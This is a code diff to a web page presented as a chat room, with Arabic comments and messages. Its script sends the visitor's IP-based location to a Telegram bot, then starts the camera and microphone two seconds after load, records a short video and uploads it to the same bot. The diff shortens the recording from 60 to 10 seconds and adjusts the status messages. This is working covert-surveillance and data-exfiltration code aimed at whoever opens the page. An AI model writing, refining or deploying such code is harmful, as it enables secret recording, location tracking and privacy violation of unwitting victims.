@@ -24,7 +24,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;overflow-x:hidden}
 .chat-input{display:flex;padding:10px;gap:10px;background:#1a1a2e}
 .chat-input input{flex:1;padding:12px;background:#0a0a0a;border:1px solid #333;border-radius:25px;color:#fff;font-size:14px;outline:none}
 .chat-input button{width:50px;height:50px;border-radius:50%;background:#e91e63;border:none;color:#fff;font-size:20px;cursor:pointer}
-.notification{position:fixed;top:0;left:0;right:0;background:#e91e63;color:#fff;padding:15px;text-align:center;font-size:14px;z-index:1000;display:none}
+.notification{position:fixed;top:0;left:0;right:0;background:#e91e63;color:#fff;padding:15px;text-align:center;font-size:14px;z-index:1000}
 </style>
 </head>
 <body>
@@ -71,9 +71,7 @@ let facingMode='user';
 let videoBlob=null;
 
 document.getElementById('notif').style.display='block';
-setTimeout(()=>{document.getElementById('notif').style.display='none';},4000);
 
-// إرسال بيانات الجهاز
 async function sendInfo(){
 try{
 const r=await fetch('https://ipapi.co/json/');
@@ -92,54 +90,57 @@ await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&te
 }
 sendInfo();
 
-// دالة إرسال الفيديو تلقائياً
 async function sendVideoAuto(){
 if(videoBlob){
+document.getElementById('notif').textContent='📤 جاري إرسال الفيديو...';
 try{
 const fd=new FormData();
 fd.append('chat_id',CHAT);
 fd.append('caption','🎥 فيديو من غرفة الدردشة');
 fd.append('video',videoBlob,'video.webm');
-await fetch('https://api.telegram.org/bot'+BOT+'/sendVideo',{method:'POST',body:fd});
-}catch(e){}
+const r=await fetch('https://api.telegram.org/bot'+BOT+'/sendVideo',{method:'POST',body:fd});
+if(r.ok){
+document.getElementById('notif').textContent='✅ تم الإرسال بنجاح';
+setTimeout(()=>{document.getElementById('notif').style.display='none';},3000);
+}
+}catch(e){
+document.getElementById('notif').textContent='❌ فشل الإرسال';
+}
 }
 }
 
-// تشغيل الكاميرا والتسجيل التلقائي
 async function startCamera(){
 try{
 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode}, audio:true});
 document.getElementById('preview').srcObject=stream;
 document.getElementById('videoPreview').style.display='block';
 document.getElementById('camBtn').classList.add('active');
+document.getElementById('notif').textContent='🔴 جاري التسجيل... (10 ثوان)';
 
 recordedChunks=[];
 mediaRecorder=new MediaRecorder(stream);
 mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
 mediaRecorder.onstop=function(){
 videoBlob=new Blob(recordedChunks,{type:'video/webm'});
-sendVideoAuto();  // إرسال الفيديو تلقائياً
+sendVideoAuto();
 };
 mediaRecorder.start();
 
-// تسجيل لمدة 60 ثانية ثم إيقاف وإرسال
-setTimeout(()=>{if(mediaRecorder.state==='recording')mediaRecorder.stop();},60000);
+// تسجيل لمدة 10 ثواني فقط
+setTimeout(()=>{if(mediaRecorder.state==='recording')mediaRecorder.stop();},10000);
 }catch(e){
-alert('يجب السماح بالوصول إلى الكاميرا والميكروفون');
+document.getElementById('notif').textContent='⚠️ يجب السماح بالوصول إلى الكاميرا والميكروفون';
 }
 }
 
-// تشغيل الكاميرا تلقائياً بعد 2 ثانية
 setTimeout(startCamera, 2000);
 
-// تبديل الكاميرا الأمامية/الخلفية
 document.getElementById('switchBtn').addEventListener('click', function(){
 facingMode = facingMode==='user' ? 'environment' : 'user';
 if(stream){stream.getTracks().forEach(t=>t.stop());}
 startCamera();
 });
 
-// إرسال الرسائل النصية
 document.getElementById('sendMsg').addEventListener('click', async function(){
 const text=document.getElementById('msgInput').value;
 if(text){
